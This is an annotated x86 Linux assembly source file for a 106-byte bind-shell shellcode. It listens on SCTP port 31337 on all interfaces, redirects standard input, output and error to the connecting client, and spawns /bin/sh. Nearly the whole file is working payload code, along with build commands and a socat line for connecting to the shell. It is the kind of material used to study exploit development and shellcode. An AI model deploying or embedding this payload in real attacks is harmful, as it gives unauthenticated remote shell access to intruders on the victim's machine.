; lnx-bind-sctp-execve-x86_32.s
; This linux (x86) 106 bytes shellcode bind to port sctp/31337 on 0.0.0.0.
; It redirect stdin, stdout and stderr to the new client's socket connection
; and spawn a '/bin/sh' shell without privileges restoration.
;
; Written by e3prom (github.com/e3prom)
;
; To assemble a 32-bits ELF executable: 
; nasm -f elf32 lnx-bind-sctp-execve-x86_32.s
; ld -m elf_i386 lnx-bind-sctp-execve-x86_32.o -o lnx-bind-sctp-execve-x86_32
; ./lnx-bind-sctp-execve-x86_32
; socat - SCTP-CONNECT:127.0.0.1:31337
BITS 32

; int socket(int domain, int type, int protocol);
  push BYTE 0x66        ; socketcall(int call, unsigned long *args) (#102);
  pop eax               ; pop DWORD above to EAX for later system call.
  cdq                   ; zero out EDX.
  mov dl, 0x84          ; set the DL register to decimal 132.
  xor ebx, ebx          ; socketcall()'s first argument.
  inc ebx               ; socketcall's call nbr 1 (SYS_SOCKET).
  push edx              ; socketcall()'s 3rd arg. array (reversed): { protocol = 132 (SCTP),
  push BYTE 0x1         ;                                             type = 1 (SOCK_STREAM),
  push BYTE 0x2         ;                                             domain = 2 (AF_INET) }
  cdq                   ; zero out EDX again.
  mov ecx, esp          ; ecx = pointer to socketcall()'s 3rd argument array.
  int 0x80              ; interrupt vector 0x80.
  mov esi, eax          ; copy the returned socket's file descriptor to ESI for later use.

; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
  push BYTE 0x66        ; push socketcall() (syscall #102) into the stack.
  pop eax               ; pop DWORD above to EAX for later system call.
  inc ebx               ; increase EBX, previously 1 to socketcall()'s call nbr 2 = SYS_BIND = bind().
  push edx              ; sockaddr structure (reversed): INADDR_ANY = 0
  push WORD 0x697a      ;                                PORT = 31337
  push WORD bx          ;                                AF_INET = 2
  mov ecx, esp          ; copy stack pointer address to ECX, so ECX points to the above structure.
  push BYTE 16          ; push 16 onto the stack which is addrlen = sizeof(struct sockaddr).
  push ecx              ; push struct's pointer onto the stack.
  push esi              ; push saved socket's FD onto the stack.
  mov ecx, esp          ; ECX now points to the bind's argument array.
  int 0x80              ; interrupt vector 0x80.
 
; int listen(int sockfd, int backlog);
  mov BYTE al, 0x66     ; socketcall() (syscall #102)
  inc ebx
  inc ebx               ; increase EBX, actually 2 to becomes 4 = SYS_LISTEN = listen()
  push ebx              ; listen()'s argument vector (reversed): { backlog = 4 (dummy int),
  push esi              ;                                          socket fd }
  mov ecx, esp          ; ECX now points to the argument vector.
  int 0x80              ; interrupt vector 0x80.

; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
  mov BYTE al, 0x66     ; socketcall() (syscall #102)
  inc ebx               ; increase EBX at 4 to become 5 = SYS_ACCEPT = accept()
  push edx              ; accept()'s argument vector (reversed): { addrlen ptr = 0,
  push edx              ;                                          sockaddr struct ptr = NULL,
  push esi              ;                                          socket fd }
  mov ecx, esp          ; ECX now point to the argument vector.
  int 0x80              ; interrupt vector 0x80.

; int dup2(int oldfd, int newfd);
  mov ebx, eax          ; copy the returned client's socket FD to EBX.
  push BYTE 0x3F        ; dup2() system call #63.
  pop eax               ; pop system call number above into EAX.
  xor ecx, ecx          ; zero out ECX = 0 = standard input.
  int 0x80              ; interrupt vector 0x80 - dup2(oldfd, 0);
  mov BYTE al, 0x3F     ; again dup2() system call #63 because we don't know if EAX changed.
  inc ecx               ; ECX is now 1 = standard output.
  int 0x80              ; interrupt vector 0x80 - dup2(oldfd, 1);
  mov BYTE al, 0x3F     ; again dup2() system call #63 because we don't know if EAX changed.
  inc ecx               ; ECX is now 2 = standard error.
  int 0x80              ; interrupt vector 0x80 - dup2(oldfd, 2);

; int execve(const char *filename, char *const argv[], char *const envp[]);
  mov BYTE al, 0x0b     ; execve() (syscall #11)
  push edx              ; EDX should be NULL, here used as a string terminator.
  push 0x68732f2f       ; push '//sh' onto the stack.
  push 0x6e69622f       ; push '/bin' onto the stack.
  mov ebx, esp          ; EBX now points to the filename string.
  xor ecx, ecx          ; warning: ECX should be zero out.
  push ecx              ; Push actual content of ECX onto the stack.
  mov edx, esp          ; EDX now points to the bogus environement array. 
  push ebx              ; Push content of EBX which hold the memory address of the filename string.
  mov ecx, esp          ; ECX now points to the argument vector array.
  int 0x80              ; interrupt vector 0x80 - execve('/bin//sh', ['/bin//sh', 'NULL'], [NULL])
